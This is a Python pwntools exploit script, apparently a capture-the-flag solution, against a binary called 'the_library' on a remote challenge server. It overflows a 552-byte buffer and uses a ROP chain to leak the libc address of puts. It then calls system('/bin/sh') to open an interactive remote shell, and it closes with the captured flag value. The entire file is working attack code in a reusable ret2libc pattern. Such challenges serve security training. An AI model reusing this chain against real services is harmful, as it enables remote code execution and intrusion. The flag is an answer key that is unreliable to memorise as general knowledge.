from pwn import *

context.binary = elf = ELF("the_library")
libc = ELF("libc-2.31.so")
rop = ROP(elf)

r = remote("challenge.ctf.games", 31125)

padding = b'A' * 552

main = elf.symbols['main']
puts_got = elf.got['puts'] 
puts_plt = elf.plt['puts']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']).address)
ret = (rop.find_gadget(['ret']))[0]

payload = padding  + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

r.sendlineafter(">", payload)

[print(r.recvline()) for _ in range(1)]

leaked = r.recvline()[:-1]
log.info(f"leaked puts address @ {leaked}")

puts_leak = u64(leaked.ljust(8,b'\x00'))
log.info(f"leaked puts address @ {hex(puts_leak)}")

libc.address = puts_leak - libc.symbols['puts']
log.info(f"libc base @ {hex(libc.address)}")

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
log.info(f"/bin/sh located @ {hex(bin_sh)}")
log.info(f"system function located @ {hex(system)}")

payload2 = padding + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system) 

r.sendline(payload2)

r.interactive()

# flag = flag{54b7742240a85bf62aa6fcf16c7e66a4}
